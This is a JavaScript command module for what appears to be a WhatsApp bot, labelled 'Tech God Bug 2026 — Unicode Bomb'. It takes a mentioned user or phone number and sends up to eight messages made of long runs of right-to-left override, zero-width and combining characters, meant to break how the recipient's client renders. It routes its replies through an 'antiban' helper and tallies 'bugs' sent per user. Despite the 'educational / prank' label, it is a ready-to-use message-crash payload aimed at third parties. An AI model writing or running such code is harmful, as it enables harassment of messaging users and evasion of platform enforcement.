/**
 * 🐛 Tech God Bug 2026 — Unicode Bomb
 * Sends RTL + heavy Unicode chars to cause rendering chaos.
 * ⚠️ EDUCATIONAL / PRANK USE ONLY
 * By Dev-Ntando
 */
'use strict';

const config  = require('../../config');
const antiban = require('../../utils/antiban');
const db      = require('../../database');

function generateUnicodeBomb() {
  const bombs = [
    '\u202E'.repeat(100),
    '\u0D9E'.repeat(200),
    '\u200F'.repeat(300) + '\u202E'.repeat(300),
    String.fromCodePoint(0x0300).repeat(500),
    '\u034F'.repeat(200) + '\u202E'.repeat(200) + '\u2069'.repeat(200),
  ];
  return bombs[Math.floor(Math.random() * bombs.length)] + '\n🐛 TECH GOD';
}

module.exports = async (sock, msg, args, { isOwner, sender, jid }) => {
  if (!config.bugsEnabled.unicode) {
    return antiban.sendHuman(sock, jid, { text: '❌ Unicode bug is currently disabled.' }, { quoted: msg });
  }

  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  let target = mentioned[0] || (args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);

  if (!target) {
    return antiban.sendHuman(sock, jid, {
      text: `🐛 *Unicode Bomb*\n\n*Usage:* ${config.prefix}unicode @user\n*Example:* ${config.prefix}unicode @someone\n\n_Sends mixed RTL/Unicode to cause rendering issues._`,
    }, { quoted: msg });
  }

  const rounds = Math.min(parseInt(args[1]) || 3, 8);

  await antiban.sendHuman(sock, jid, { text: `🐛 *Sending unicode bomb...*\n🎯 Target: @${target.split('@')[0]}\n💣 Rounds: ${rounds}`, mentions: [target] }, { quoted: msg });

  for (let i = 0; i < rounds; i++) {
    await sock.sendMessage(target, { text: generateUnicodeBomb() });
    await new Promise(r => setTimeout(r, 500));
  }

  db.incrementStat('totalBugs');
  db.incrementUserStat(sender, 'bugs');

  await antiban.sendHuman(sock, jid, { text: `✅ *Unicode bomb sent!*\n🐛 ${rounds} rounds to @${target.split('@')[0]}`, mentions: [target] }, { quoted: msg });
};
